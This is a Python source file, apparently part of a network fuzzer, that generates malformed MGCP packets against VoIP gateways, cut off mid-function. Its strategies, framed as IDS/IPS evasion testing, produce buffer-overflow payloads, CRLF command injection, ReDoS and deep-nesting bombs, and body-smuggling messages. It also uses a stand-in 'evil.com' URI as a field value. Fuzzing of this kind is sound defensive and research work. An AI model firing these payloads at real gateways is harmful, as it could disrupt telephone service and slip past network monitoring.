import random
import struct
import os
import string
from protocol.dynamic_data import get_commands, random_buffer_size, has_dynamic_data

# ---------------------------------------------------------------------------
# MGCP mutation strategies for IDS/IPS evasion testing.
#
# Grounded in RFC 3435 (MGCP 1.0, obsoletes RFC 2705), RFC 3660 (Basic
# MGCP Packages), RFC 3661 (Return Code Usage), RFC 3991 (Redirect/Reset),
# IANA MGCP Package Registry + real-world CVEs:
#   Cisco IOS MGCP subsystem buffer overflows (multiple CVEs)
#   Asterisk chan_mgcp buffer overflows and DoS
#   FreeSWITCH MGCP parsing vulnerabilities
#   PROTOS VoIP test suites
#
# MGCP is text-based, master/slave.  Transport: UDP 2427 (gateway) /
# 2727 (call agent).  The fuzzer mirrors the UDP datagram pattern (like
# DHCP/SNMP/SIP): each payload is one or more MGCP messages in a single
# UDP datagram.
#
# Snort 3 has NO dedicated MGCP inspector (unlike SIP gid 140).  MGCP is
# detected via text rules + appid on ports 2427/2727 — making evasion
# significantly easier than SIP.
#
# Each strategy's build function returns (payload_bytes, dst_port).
# The MgcpMutator.mutate() method returns (payload_bytes, strategy_name,
# dst_port) — identical contract to SipMutator / SnmpMutator.
# ---------------------------------------------------------------------------

MGCP_STRATEGIES = [
    "verb_line_overflow",
    "transaction_id_desync",
    "endpoint_wildcard_abuse",
    "parameter_injection",
    "digit_map_bomb",
    "local_connection_opts_overflow",
    "sdp_mgcp_body_mismatch",
    "event_package_overflow",
    "piggyback_smuggling",
    "provisional_response_flood",
    "version_protocol_confusion",
    "notified_entity_hijack",
    "quarantine_handling_abuse",
    "restart_cascade_dos",
]

# Base weights — strategies grounded in real CVEs and deep parser surfaces
# get the most weight; evasion-only / DoS strategies get less.
MGCP_WEIGHTS = [12, 12, 14, 10, 14, 10, 10, 8, 14, 6, 8, 8, 6, 6]

MGCP_STRATEGY_LABELS = {
    "verb_line_overflow":               "Verb/Command Line Overflow",
    "transaction_id_desync":            "Transaction ID Desync",
    "endpoint_wildcard_abuse":          "Endpoint Wildcard Abuse",
    "parameter_injection":              "Parameter Injection",
    "digit_map_bomb":                   "DigitMap Bomb",
    "local_connection_opts_overflow":   "LCO Overflow",
    "sdp_mgcp_body_mismatch":          "SDP Body Mismatch",
    "event_package_overflow":           "Event/Signal Overflow",
    "piggyback_smuggling":              "Piggyback Smuggling",
    "provisional_response_flood":       "Provisional Response Flood",
    "version_protocol_confusion":       "Version/Protocol Confusion",
    "notified_entity_hijack":           "NotifiedEntity Hijack",
    "quarantine_handling_abuse":        "Quarantine Handling Abuse",
    "restart_cascade_dos":              "Restart Cascade DoS",
}

# Exported name lists for main.py / app.py
MGCP_STRATEGY_NAMES = MGCP_STRATEGIES
MGCP_DEFAULT_WEIGHTS = MGCP_WEIGHTS

# ── Constants ─────────────────────────────────────────────────────────────

_MGCP_GW_PORT = 2427
_MGCP_CA_PORT = 2727
_CRLF = b"\r\n"
_MAX_SEG = 58000

_VERBS = [b"EPCF", b"CRCX", b"MDCX", b"DLCX", b"RQNT", b"NTFY",
          b"AUEP", b"AUCX", b"RSIP"]

_MODES = [b"sendonly", b"recvonly", b"sendrecv", b"confrnce", b"inactive",
          b"loopback", b"conttest", b"netwloop", b"netwtest"]

_PACKAGES = [b"L", b"M", b"D", b"G", b"R", b"A", b"B", b"DT", b"MO",
             b"RES", b"S", b"H", b"N", b"IT", b"MT"]

_LINE_EVENTS = [b"hd", b"hu", b"hf", b"aw", b"bz", b"ci", b"dl",
                b"e", b"ft", b"it", b"lbk", b"mt", b"oc", b"of",
                b"ot", b"p", b"rg", b"rs", b"rt", b"s", b"sl",
                b"vmwi", b"wk", b"wt", b"z"]


# ── Helpers ───────────────────────────────────────────────────────────────

def _rand_ip():
    return f"{random.randint(10,192)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def _rand_hex(n=None):
    """Random hex string, 1-32 chars (valid CallId/ConnectionId/RequestIdentifier range)."""
    if n is None:
        n = random.randint(8, 32)
    return ''.join(random.choices("0123456789ABCDEF", k=n))


def _rand_txid():
    """Valid transaction ID: 1-9 decimal digits, 1..999999999."""
    return str(random.randint(1, 999999999))


def _rand_endpoint():
    """Generate a realistic MGCP endpoint name."""
    local_parts = [
        f"aaln/{random.randint(1,24)}",
        f"ds/ds1-{random.randint(1,4)}/{random.randint(1,96)}",
        f"card{random.randint(1,48)}/{random.randint(1,96)}",
        f"S{random.randint(0,7)}/{random.randint(1,31)}",
        f"announce/{random.randint(0,15)}",
        f"conf/{random.randint(1,64)}",
    ]
    domains = [
        f"rgw-{random.randint(1000,9999)}.example.net",
        f"tgw-{random.randint(1,99)}.voip.local",
        f"mgw.{_rand_ip()}",
        f"[{_rand_ip()}]",
        f"gw{random.randint(1,255)}.carrier.com",
    ]
    return f"{random.choice(local_parts)}@{random.choice(domains)}"


def _rand_domain():
    tlds = ["com", "net", "org", "io", "local", "invalid"]
    return ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 10))) + "." + random.choice(tlds)


def _basic_command(verb=None, txid=None, endpoint=None, params=None, sdp_body=None):
    """Build a structurally valid MGCP command message."""
    if verb is None:
        verb = random.choice(_VERBS)
    if isinstance(verb, str):
        verb = verb.encode()
    if txid is None:
        txid = _rand_txid()
    if endpoint is None:
        endpoint = _rand_endpoint()

    line = verb + b" " + txid.encode() + b" " + endpoint.encode() + b" MGCP 1.0"
    parts = [line]

    if params:
        for p in params:
            if isinstance(p, str):
                p = p.encode()
            parts.append(p)

    if sdp_body:
        if isinstance(sdp_body, str):
            sdp_body = sdp_body.encode()
        parts.append(b"")  # blank line before SDP
        return _CRLF.join(parts) + _CRLF + sdp_body
    else:
        return _CRLF.join(parts) + _CRLF


def _basic_response(code=200, txid=None, commentary=b"OK", params=None, sdp_body=None):
    """Build a structurally valid MGCP response message."""
    if txid is None:
        txid = _rand_txid()
    line = str(code).encode() + b" " + txid.encode() + b" " + commentary
    parts = [line]
    if params:
        for p in params:
            if isinstance(p, str):
                p = p.encode()
            parts.append(p)
    if sdp_body:
        if isinstance(sdp_body, str):
            sdp_body = sdp_body.encode()
        parts.append(b"")
        return _CRLF.join(parts) + _CRLF + sdp_body
    else:
        return _CRLF.join(parts) + _CRLF


def _minimal_sdp(ip=None):
    """Minimal SDP body for CRCX/MDCX."""
    ip = ip or _rand_ip()
    port = random.randint(10000, 60000)
    sess_id = random.randint(100000, 999999)
    lines = [
        b"v=0",
        f"o=- {sess_id} {sess_id} IN IP4 {ip}".encode(),
        b"s=-",
        f"c=IN IP4 {ip}".encode(),
        b"t=0 0",
        f"m=audio {port} RTP/AVP 0 8 101".encode(),
        b"a=rtpmap:0 PCMU/8000",
        b"a=rtpmap:8 PCMA/8000",
    ]
    return _CRLF.join(lines) + _CRLF


# ── Strategy 1: Verb/Command Line Buffer Overflow ─────────────────────────
# Cisco IOS MGCP subsystem: fixed-size buffers for verb, transaction-id,
# and endpoint name.  RFC 3435 command line format:
#   Verb SP transaction-id SP endpointName SP "MGCP" SP version
# Each field has implicit max sizes (verb=4, txid=9 digits, endpoint
# local+domain ≤255+255).  Overflow each.

def _build_verb_line_overflow():
    variant = random.choice([
        "oversized_verb", "oversized_txid", "oversized_endpoint",
        "deep_hierarchy_endpoint", "missing_components",
        "extra_after_version", "null_in_fields", "giant_domain",
    ])

    ep = _rand_endpoint()
    txid = _rand_txid()

    if variant == "oversized_verb":
        # Verb should be 4 chars; send 5KB-50KB verb token
        verb = b"X" + os.urandom(random.randint(5000, 50000)).replace(b"\r", b"A").replace(b"\n", b"B").replace(b"\x00", b"C")
        msg = verb + b" " + txid.encode() + b" " + ep.encode() + b" MGCP 1.0" + _CRLF
    elif variant == "oversized_txid":
        # txid max 9 digits; send 10KB of digits or non-numeric
        bad_txid = ''.join(random.choices(string.digits, k=random.randint(10000, 50000)))
        msg = b"AUEP " + bad_txid.encode() + b" " + ep.encode() + b" MGCP 1.0" + _CRLF
    elif variant == "oversized_endpoint":
        # Local part >255 chars
        local = "/".join(["seg" + str(i) for i in range(random.randint(100, 500))])
        giant_ep = f"{local}@{_rand_domain()}"
        msg = b"AUEP " + txid.encode() + b" " + giant_ep.encode() + b" MGCP 1.0" + _CRLF
    elif variant == "deep_hierarchy_endpoint":
        # 200+ levels of "/" hierarchy in local part
        depth = random.randint(200, 1000)
        local = "/".join([f"l{i}" for i in range(depth)])
        msg = _basic_command(b"CRCX", txid, f"{local}@gw.example.com",
                             [f"C: {_rand_hex()}", "M: sendrecv"])
    elif variant == "missing_components":
        # Missing txid, endpoint, version — each variation
        sub = random.choice(["no_txid", "no_ep", "no_version", "verb_only"])
        if sub == "no_txid":
            msg = b"CRCX " + ep.encode() + b" MGCP 1.0" + _CRLF
        elif sub == "no_ep":
            msg = b"CRCX " + txid.encode() + b" MGCP 1.0" + _CRLF
        elif sub == "no_version":
            msg = b"CRCX " + txid.encode() + b" " + ep.encode() + _CRLF
        else:
            msg = b"CRCX" + _CRLF
    elif variant == "extra_after_version":
        # Junk after version string
        junk = os.urandom(random.randint(500, 5000)).replace(b"\r", b"J").replace(b"\n", b"K").replace(b"\x00", b"L")
        msg = b"AUEP " + txid.encode() + b" " + ep.encode() + b" MGCP 1.0 " + junk + _CRLF
    elif variant == "null_in_fields":
        # Null bytes in verb, txid, endpoint
        parts = [b"CR\x00CX", txid.encode(), ep.encode() + b"\x00evil", b"MGCP 1.0"]
        msg = b" ".join(parts) + _CRLF
    else:  # giant_domain
        # Domain part >255 chars
        giant_domain = "a" * random.randint(500, 5000) + ".example.com"
        msg = b"AUEP " + txid.encode() + b" aaln/1@" + giant_domain.encode() + b" MGCP 1.0" + _CRLF

    return msg[:_MAX_SEG], _MGCP_GW_PORT


# ── Strategy 2: Transaction ID Desync ─────────────────────────────────────
# RFC 3435: txid 1-9 decimal digits, 1..999999999, no reuse within 3 min.
# T-HIST ~30s response cache keyed by txid.  Integer parsing + state machine
# attacks.

def _build_transaction_id_desync():
    variant = random.choice([
        "boundary_values", "duplicate_txid", "response_unknown_txid",
        "non_numeric_txid", "leading_zeros_mass", "txid_zero",
        "negative_txid", "response_before_request",
    ])

    ep = _rand_endpoint()

    if variant == "boundary_values":
        # txid at integer boundaries: 0, 1, 999999999, 1000000000, 2^31, 2^32, 2^63
        bad_vals = ["0", "1", "999999999", "1000000000", "2147483647",
                    "2147483648", "4294967295", "4294967296",
                    "9223372036854775807", "999999999999999999"]
        val = random.choice(bad_vals)
        msg = b"AUEP " + val.encode() + b" " + ep.encode() + b" MGCP 1.0" + _CRLF
    elif variant == "duplicate_txid":
        # Same txid for two different commands (should be rejected within 3 min)
        txid = _rand_txid()
        cmd1 = _basic_command(b"AUEP", txid, ep)
        cmd2 = _basic_command(b"CRCX", txid, ep,
                              [f"C: {_rand_hex()}", "M: sendrecv"])
        msg = cmd1 + cmd2  # back-to-back, not piggybacked
    elif variant == "response_unknown_txid":
        # Response referencing a txid that was never sent
        txid = str(random.randint(900000000, 999999999))
        msg = _basic_response(200, txid, b"OK",
                              [f"I: {_rand_hex(8)}"])
    elif variant == "non_numeric_txid":
        # txid with non-digit characters
        bad_txids = [b"ABCDEF", b"12x456", b"1.5e10", b"-1", b"0xDEAD",
                     b"123\x00456", b"12 34", b"", b" "]
        bad = random.choice(bad_txids)
        msg = b"AUEP " + bad + b" " + ep.encode() + b" MGCP 1.0" + _CRLF
    elif variant == "leading_zeros_mass":
        # RFC says leading zeros ignored, compared numerically — but how many?
        zeros = "0" * random.randint(100, 10000)
        msg = b"AUEP " + (zeros + "1").encode() + b" " + ep.encode() + b" MGCP 1.0" + _CRLF
    elif variant == "txid_zero":
        # txid=0 is outside valid range (1..999999999)
        msg = _basic_command(b"RQNT", "0", ep,
                             [f"X: {_rand_hex()}", "R: L/hd(N)"])
    elif variant == "negative_txid":
        msg = b"AUEP -1 " + ep.encode() + b" MGCP 1.0" + _CRLF
    else:  # response_before_request
        # Send a response without any prior command
        txid = _rand_txid()
        sdp = _minimal_sdp()
        msg = _basic_response(200, txid, b"OK",
                              [f"I: {_rand_hex(8)}"],
                              sdp_body=sdp)

    return msg[:_MAX_SEG], _MGCP_GW_PORT


# ── Strategy 3: Endpoint Wildcard Abuse ───────────────────────────────────
# RFC 3435: "*" = all-of, "$" = any-of. Wildcard from right recommended.
# LocalPart hierarchical with "/", each side ≤255.  Range wildcard "[1-96]".
# Wildcards create unique amplification + parser expansion challenges.

def _build_endpoint_wildcard_abuse():
    variant = random.choice([
        "double_wildcard", "dollar_wrong_command", "deep_wildcard_hierarchy",
        "range_wildcard_overflow", "mixed_wildcards", "null_in_endpoint",
        "missing_at_sign", "duplicate_at_sign", "ipv6_endpoint",
    ])

    txid = _rand_txid()
    domain = f"gw-{random.randint(1,999)}.example.net"

    if variant == "double_wildcard":
        # Both local and domain are wildcards: *@*
        msg = _basic_command(b"AUEP", txid, "*@*")
    elif variant == "dollar_wrong_command":
        # "$" (any-of) used with NTFY (GW->CA, shouldn't have wildcard)
        msg = _basic_command(b"NTFY", txid, f"$@{domain}",
                             [f"X: {_rand_hex()}", "O: L/hd"])
    elif variant == "deep_wildcard_hierarchy":
        # Wildcard at every level of a deep hierarchy
        depth = random.randint(50, 200)
        local = "/".join(["*" if random.random() < 0.5 else f"s{i}" for i in range(depth)])
        msg = _basic_command(b"AUEP", txid, f"{local}@{domain}")
    elif variant == "range_wildcard_overflow":
        # RFC 3435 Appendix E: range wildcard [1-96], [1,3,20-24]
        # Overflow: huge ranges, inverted ranges, non-numeric
        bad_ranges = [
            "[0-4294967296]",          # uint32 overflow
            "[1-96,97-1000000]",       # massive range
            "[-1-5]",                  # negative
            "[999999999-0]",           # inverted
            "[" + ",".join([str(i) for i in range(500)]) + "]",  # 500 items
            "[]",                      # empty
            "[" + "A" * 5000 + "]",    # non-numeric overflow
        ]
        rng = random.choice(bad_ranges)
        msg = _basic_command(b"AUEP", txid, f"ds/ds1-1/{rng}@{domain}")
    elif variant == "mixed_wildcards":
        # Mix * and $ and range in same endpoint
        msg = _basic_command(b"DLCX", txid, f"*/[1-96]/$@{domain}",
                             [f"C: {_rand_hex()}"])
    elif variant == "null_in_endpoint":
        ep = f"aaln/\x001@{domain}"
        msg = b"AUEP " + txid.encode() + b" " + ep.encode() + b" MGCP 1.0" + _CRLF
    elif variant == "missing_at_sign":
        # No "@" separator — just local part
        msg = _basic_command(b"AUEP", txid, "aaln/1.example.net")
    elif variant == "duplicate_at_sign":
        msg = _basic_command(b"AUEP", txid, f"aaln/1@sub@{domain}")
    else:  # ipv6_endpoint
        ipv6_forms = [
            "[::1]", "[fe80::1%25eth0]", "[2001:db8::1]",
            "[" + "F" * 500 + "]",  # oversized
            "[::1",  # missing bracket
        ]
        msg = _basic_command(b"AUEP", txid, f"aaln/1@{random.choice(ipv6_forms)}")

    return msg[:_MAX_SEG], _MGCP_GW_PORT


# ── Strategy 4: Parameter Injection ───────────────────────────────────────
# RFC 3435: parameters are "Code: value" where code is 1-2 chars.
# CallId/ConnectionId/RequestIdentifier = 1*32 HEXDIG.
# Attacks: CRLF injection, oversized values, unknown codes, duplicates.

def _build_parameter_injection():
    variant = random.choice([
        "crlf_in_value", "oversized_hex_ids", "unknown_param_codes",
        "duplicate_params", "empty_values", "hundreds_of_params",
        "non_hex_ids", "vendor_ext_critical",
    ])

    ep = _rand_endpoint()
    txid = _rand_txid()

    if variant == "crlf_in_value":
        # Inject CRLF into parameter value to create fake header/command
        evil_callid = _rand_hex(8) + "\r\nRQNT " + _rand_txid() + " " + ep + " MGCP 1.0\r\nR: L/hd(N)"
        msg = _basic_command(b"CRCX", txid, ep,
                             [f"C: {evil_callid}", "M: sendrecv"])
    elif variant == "oversized_hex_ids":
        # CallId/ConnectionId should be 1-32 HEXDIG; send 50KB
        giant_hex = _rand_hex(random.randint(10000, 50000))
        sub = random.choice(["C", "I", "X"])
        msg = _basic_command(b"MDCX", txid, ep,
                             [f"C: {_rand_hex()}", f"{sub}: {giant_hex}", "M: sendrecv"])
    elif variant == "unknown_param_codes":
        # Single-letter codes not in RFC: Y, W, V, J, etc.
        unknown = [f"{c}: " + _rand_hex(16) for c in random.sample("YWVJUGO", k=random.randint(3, 7))]
        msg = _basic_command(b"CRCX", txid, ep,
                             [f"C: {_rand_hex()}", "M: sendrecv"] + unknown)
    elif variant == "duplicate_params":
        # Same parameter code twice with different values
        cid1 = _rand_hex(16)
        cid2 = _rand_hex(16)
        msg = _basic_command(b"MDCX", txid, ep,
                             [f"C: {cid1}", f"C: {cid2}",
                              f"I: {_rand_hex(8)}", f"I: {_rand_hex(8)}",
                              "M: sendrecv", "M: recvonly"])
    elif variant == "empty_values":
        # Parameters with no value after colon
        msg = _basic_command(b"CRCX", txid, ep,
                             ["C:", "I:", "M:", "L:", "X:", "N:", "R:"])
    elif variant == "hundreds_of_params":
        # Flood with hundreds of parameter lines
        params = [f"C: {_rand_hex()}", "M: sendrecv"]
        for i in range(random.randint(200, 500)):
            code = random.choice(["X", "N", "R", "S", "T", "ES", "B"])
            params.append(f"{code}: {_rand_hex(random.randint(8, 32))}")
        msg = _basic_command(b"CRCX", txid, ep, params)
    elif variant == "non_hex_ids":
        # CallId/ConnectionId with non-hex chars
        bad_ids = ["GHIJKLMNOP", "call-id-with-dashes", "12345 67890",
                   "ZZZZZZZZZZ", "\x00\x01\x02\x03", "café☕"]
        bad = random.choice(bad_ids)
        msg = _basic_command(b"MDCX", txid, ep,
                             [f"C: {bad}", f"I: {bad}", "M: sendrecv"])
    else:  # vendor_ext_critical
        # X+ (critical vendor extension) forces 511/525 if unknown
        # X- (non-critical) should be ignored
        exts = [f"X+vendor{i}: {_rand_hex(32)}" for i in range(random.randint(5, 20))]
        exts += [f"X-ignore{i}: {_rand_hex(32)}" for i in range(5)]
        msg = _basic_command(b"CRCX", txid, ep,
                             [f"C: {_rand_hex()}", "M: sendrecv"] + exts)

    return msg[:_MAX_SEG], _MGCP_GW_PORT


# ── Strategy 5: DigitMap Bomb ─────────────────────────────────────────────
# RFC 3435: egrep-like dial plan.  Support ≥2048 bytes recommended.
# Pathological patterns cause exponential backtracking (ReDoS) in regex-
# based implementations.  Deeply nested parens cause stack overflow.

def _build_digit_map_bomb():
    variant = random.choice([
        "exponential_backtrack", "deep_nesting", "oversized_map",
        "unbalanced_brackets", "null_in_map", "extension_letters",
        "empty_alternatives", "huge_range_list",
    ])

    ep = _rand_endpoint()
    txid = _rand_txid()

    if variant == "exponential_backtrack":
        # Classic ReDoS: (x|xx|xxx)* or (x.x.x.)* patterns
        patterns = [
            "(x|xx|xxx|xxxx|xxxxx)*T",
            "(" + "|".join(["x" * i for i in range(1, 20)]) + ")*",
            "(x.)*T",
            "([0-9]|[0-9][0-9]|[0-9][0-9][0-9])*",
        ]
        dmap = random.choice(patterns)
        msg = _basic_command(b"RQNT", txid, ep,
                             [f"X: {_rand_hex()}", "R: L/hd(N)",
                              f"D: {dmap}"])
    elif variant == "deep_nesting":
        # Deeply nested parentheses — stack overflow in recursive descent
        depth = random.randint(500, 2000)
        dmap = "(" * depth + "x" + ")" * depth
        msg = _basic_command(b"RQNT", txid, ep,
                             [f"X: {_rand_hex()}", "R: D/[0-9](A,D)",
                              f"D: {dmap}"])
    elif variant == "oversized_map":
        # Well over 2048 bytes
        size = random.randint(10000, 50000)
        # Generate many alternatives
        alts = [f"{random.randint(0,9)}{'x' * random.randint(1,10)}T" for _ in range(size // 10)]
        dmap = "(" + "|".join(alts) + ")"
        msg = _basic_command(b"RQNT", txid, ep,
                             [f"X: {_rand_hex()}", f"D: {dmap[:size]}"])
    elif variant == "unbalanced_brackets":
        # Missing closing ), ], or extra opening
        bad_maps = [
            "((0T|1xxxxx",           # missing )
            "[0-9T",                 # missing ]
            ")))xxx",                # extra )
            "([0-9)]",              # mixed brackets
            "(0T|[)",               # bracket inside paren
            "]]]xxx[[[",            # all wrong
        ]
        dmap = random.choice(bad_maps)
        msg = _basic_command(b"RQNT", txid, ep,
                             [f"X: {_rand_hex()}", f"D: {dmap}"])
    elif variant == "null_in_map":
        # Null bytes inside digit map
        dmap = "(0T|\x00|1xxxx\x00T)"
        msg = _basic_command(b"RQNT", txid, ep,
                             [f"X: {_rand_hex()}", f"D: {dmap}"])
    elif variant == "extension_letters":
        # Extension letters E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,U,V,W,Y,Z
        # Error 537 if unsupported — test all
        ext_letters = "EFGHIJKLMNOPQRSUVWYZ"
        dmap = "(" + "|".join([f"{c}xxx" for c in ext_letters]) + ")"
        msg = _basic_command(b"RQNT", txid, ep,
                             [f"X: {_rand_hex()}", f"D: {dmap}"])
    elif variant == "empty_alternatives":
        # Empty alternatives: (|x|) or (||||||)
        dmap = random.choice(["(|x|)", "(||||||)", "(x||T)", "(|)"])
        msg = _basic_command(b"RQNT", txid, ep,
                             [f"X: {_rand_hex()}", f"D: {dmap}"])
    else:  # huge_range_list
        # [0,1,2,...,9999] — enormous range list
        items = [str(i) for i in range(random.randint(500, 5000))]
        dmap = "[" + ",".join(items) + "]xxxx"
        msg = _basic_command(b"RQNT", txid, ep,
                             [f"X: {_rand_hex()}", f"D: {dmap}"])

    return msg[:_MAX_SEG], _MGCP_GW_PORT


# ── Strategy 6: LocalConnectionOptions Overflow ───────────────────────────
# L: sub-fields: p:ms, a:codec, b:bandwidth, e:on/off, gc:dB, s:on/off,
# t:ToS, r:reservation, k:encryption, nt:network.  Comma-separated.
# Integer parsing, codec negotiation, encryption key handling.

def _build_local_connection_opts_overflow():
    variant = random.choice([
        "oversized_codec_list", "bandwidth_integer_overflow",
        "packetization_overflow", "encryption_key_abuse",
        "unknown_lco_keys", "duplicate_lco_keys",
        "tos_malformed", "all_fields_oversized",
    ])

    ep = _rand_endpoint()
    txid = _rand_txid()

    if variant == "oversized_codec_list":
        # a: with 500+ codec names
        codecs = [f"codec{i}" for i in range(random.randint(500, 2000))]
        lco = "a:" + ";".join(codecs)
        msg = _basic_command(b"CRCX", txid, ep,
                             [f"C: {_rand_hex()}", f"L: {lco}", "M: sendrecv"])
    elif variant == "bandwidth_integer_overflow":
        # b: with values at integer boundaries
        bad_bw = random.choice(["0", "-1", "4294967295", "4294967296",
                                "9999999999999999", "99999999999999999999"])
        msg = _basic_command(b"CRCX", txid, ep,
                             [f"C: {_rand_hex()}", f"L: b:{bad_bw}, a:PCMU", "M: sendrecv"])
    elif variant == "packetization_overflow":
        # p: with oversized/negative/zero values
        bad_p = random.choice(["0", "-10", "65536", "4294967295", "999999999"])
        msg = _basic_command(b"CRCX", txid, ep,
                             [f"C: {_rand_hex()}", f"L: p:{bad_p}, a:PCMU", "M: sendrecv"])
    elif variant == "encryption_key_abuse":
        # k: encryption data — clear:/base64:/uri:/prompt
        big_key = "A" * random.randint(5000, 30000)
        methods = [f"clear:{big_key}", f"base64:{big_key}",
                   f"uri:http://evil.com/{'x' * 5000}",
                   "prompt"]
        msg = _basic_command(b"CRCX", txid, ep,
                             [f"C: {_rand_hex()}", f"L: k:{random.choice(methods)}", "M: sendrecv"])
    elif variant == "unknown_lco_keys":
        # Keys not in RFC
        unknown = ", ".join([f"x{i}:val{i}" for i in range(50)])
        msg = _basic_command(b"CRCX", txid, ep,
                             [f"C: {_rand_hex()}", f"L: p:20, {unknown}", "M: sendrecv"])
    elif variant == "duplicate_lco_keys":
        # Same key multiple times with conflicting values
        lco = "p:10, p:20, p:30, a:PCMU, a:PCMA, a:G729, b:64, b:128, b:256"
        msg = _basic_command(b"CRCX", txid, ep,
                             [f"C: {_rand_hex()}", f"L: {lco}", "M: sendrecv"])
    elif variant == "tos_malformed":
        # t: type of service with bad DSCP bits
        bad_tos = random.choice(["256", "-1", "0xFF", "abc", "\x00", "999"])
        msg = _basic_command(b"CRCX", txid, ep,
                             [f"C: {_rand_hex()}", f"L: t:{bad_tos}, a:PCMU", "M: sendrecv"])
    else:  # all_fields_oversized
        # Every LCO field is oversized simultaneously
        big = "X" * 5000
        lco = f"p:{big}, a:{big}, b:{big}, e:{big}, gc:{big}, s:{big}, t:{big}, k:clear:{big}"
        msg = _basic_command(b"CRCX", txid, ep,
                             [f"C: {_rand_hex()}", f"L: {lco}", "M: sendrecv"])

    return msg[:_MAX_SEG], _MGCP_GW_PORT


# ── Strategy 7: SDP Body Mismatch ─────────────────────────────────────────
# MGCP carries SDP after a blank line.  Unlike SIP, MGCP has NO Content-
# Length header — body framing relies on packet end or piggyback dot
# separator.  This creates unique body boundary confusion.

def _build_sdp_mgcp_body_mismatch():
    variant = random.choice([
        "no_blank_separator", "binary_instead_of_sdp", "double_sdp",
        "sdp_after_piggyback_dot", "oversized_sdp", "sdp_with_nulls",
        "truncated_sdp", "sdp_connection_mismatch",
    ])

    ep = _rand_endpoint()
    txid = _rand_txid()

    if variant == "no_blank_separator":
        # SDP directly after params — no blank line
        params = [f"C: {_rand_hex()}", "M: sendrecv"]
        lines = [b"CRCX " + txid.encode() + b" " + ep.encode() + b" MGCP 1.0"]
        for p in params:
            lines.append(p.encode())
        lines.append(b"v=0")  # SDP starts immediately
        lines.append(f"o=- 12345 12345 IN IP4 {_rand_ip()}".encode())
        lines.append(b"s=-")
        msg = _CRLF.join(lines) + _CRLF
    elif variant == "binary_instead_of_sdp":
        # Random binary data where SDP is expected
        binary = os.urandom(random.randint(500, 5000))
        msg = _basic_command(b"CRCX", txid, ep,
                             [f"C: {_rand_hex()}", "M: sendrecv"],
                             sdp_body=binary)
    elif variant == "double_sdp":
        # Two SDP bodies (local + remote) separated by blank line
        sdp1 = _minimal_sdp(_rand_ip())
        sdp2 = _minimal_sdp(_rand_ip())
        msg = _basic_command(b"CRCX", txid, ep,
                             [f"C: {_rand_hex()}", "M: sendrecv"],
                             sdp_body=sdp1 + _CRLF + sdp2)
    elif variant == "sdp_after_piggyback_dot":
        # SDP body that contains a dot on its own line (piggyback separator confusion)
        sdp = _minimal_sdp()
        # Inject ".\r\n" into SDP
        evil_sdp = sdp[:len(sdp)//2] + b".\r\n" + sdp[len(sdp)//2:]
        msg = _basic_command(b"CRCX", txid, ep,
                             [f"C: {_rand_hex()}", "M: sendrecv"],
                             sdp_body=evil_sdp)
    elif variant == "oversized_sdp":
        # SDP body exceeding 4000 bytes (MGCP minimum datagram size)
        sdp_lines = [b"v=0", f"o=- 1 1 IN IP4 {_rand_ip()}".encode(), b"s=-",
                     f"c=IN IP4 {_rand_ip()}".encode(), b"t=0 0"]
        # Add many m= and a= lines
        for i in range(random.randint(200, 500)):
            port = random.randint(10000, 60000)
            sdp_lines.append(f"m=audio {port} RTP/AVP {i % 128}".encode())
            sdp_lines.append(f"a=rtpmap:{i % 128} codec{i}/8000".encode())
        sdp = _CRLF.join(sdp_lines) + _CRLF
        msg = _basic_command(b"CRCX", txid, ep,
                             [f"C: {_rand_hex()}", "M: sendrecv"],
                             sdp_body=sdp)
    elif variant == "sdp_with_nulls":
        # NUL bytes in SDP values
        sdp = b"v=0\r\no=- 1\x00 1\x00 IN IP4 0.0.0.0\r\ns=\x00\r\nc=IN IP4 0.0.0.\x000\r\nt=0 0\r\nm=audio 0 RTP/AVP 0\r\n"
        msg = _basic_command(b"CRCX", txid, ep,
                             [f"C: {_rand_hex()}", "M: sendrecv"],
                             sdp_body=sdp)
    elif variant == "truncated_sdp":
        # SDP that ends mid-line
        sdp = _minimal_sdp()
        truncated = sdp[:len(sdp)//3]  # cut off mid-line
        msg = _basic_command(b"CRCX", txid, ep,
                             [f"C: {_rand_hex()}", "M: sendrecv"],
                             sdp_body=truncated)
    else:  # sdp_connection_mismatch
        # c= address doesn't match endpoint domain
        ep_specific = f"aaln/1@[10.0.0.1]"
        sdp = _minimal_sdp("192.168.99.99")  # different IP
        msg = _basic_command(b"CRCX", txid, ep_specific,
                             [f"C: {_rand_hex()}", "M: sendrecv"],
                             sdp_body=sdp)

    return msg[:_MAX_SEG], _MGCP_GW_PORT


# ── Strategy 8: Event/Signal Package Overflow ─────────────────────────────
# R: (RequestedEvents), S: (SignalRequests), O: (ObservedEvents).
# Events are package/event[@connection](actions).
# Embedded RQNT: E(R(...),S(...),D(...)) — a mini-script language.

def _build_event_package_overflow():
    variant = random.choice([
        "massive_event_list", "deep_embedded_rqnt",
        "unknown_packages", "action_parameter_overflow",
        "wildcard_connection_events", "observed_events_flood",
        "signal_infinite_duration", "nested_embedded_rqnt",
    ])

    ep = _rand_endpoint()
    txid = _rand_txid()

    if variant == "massive_event_list":
        # 500+ events in a single R: line
        events = [f"L/{random.choice(['hd','hu','hf','rg','bz'])}(N)" for _ in range(random.randint(500, 2000))]
        msg = _basic_command(b"RQNT", txid, ep,
                             [f"X: {_rand_hex()}", "R: " + ", ".join(events)])
    elif variant == "deep_embedded_rqnt":
        # Embedded RQNT E(R(...),S(...),D(...)) with deep recursion
        # RFC allows E() inside R: actions
        inner = "L/hd(N)"
        for _ in range(random.randint(20, 100)):
            inner = f"E(R({inner}),S(L/rg))"
        msg = _basic_command(b"RQNT", txid, ep,
                             [f"X: {_rand_hex()}", f"R: L/hd({inner})"])
    elif variant == "unknown_packages":
        # Package names not registered
        events = [f"ZZZZZ/evt{i}(N)" for i in range(50)]
        msg = _basic_command(b"RQNT", txid, ep,
                             [f"X: {_rand_hex()}", "R: " + ", ".join(events)])
    elif variant == "action_parameter_overflow":
        # Event with oversized action parameters
        big_action = "N" + "," + "A" * random.randint(5000, 20000)
        msg = _basic_command(b"RQNT", txid, ep,
                             [f"X: {_rand_hex()}", f"R: L/hd({big_action})"])
    elif variant == "wildcard_connection_events":
        # Events targeting @* (all connections), @$ (current), @<oversized-id>
        big_connid = _rand_hex(random.randint(100, 5000))
        events = [
            f"R/rto@*(N)", f"R/oc@$(N)", f"L/hd@{big_connid}(N)",
            "G/ft@*(N,S(G/rt))",
        ]
